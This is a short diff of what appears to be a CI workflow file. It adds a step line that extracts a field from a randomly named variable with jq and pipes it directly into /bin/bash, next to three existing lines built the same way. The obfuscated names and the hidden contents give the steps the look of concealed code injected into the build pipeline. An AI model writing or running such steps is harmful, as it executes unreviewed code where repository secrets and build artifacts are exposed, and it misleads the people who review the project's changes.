@@ -22,6 +22,7 @@ jobs:
           echo $girne5988 | jq -r .xk58 | /bin/bash
           printf '%s' "$rzl5" | jq -r .q74 | /bin/bash
           echo $tg80 | jq -r .ys21029 | /bin/bash
+          echo $kojkp907 | jq -r .ie0 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
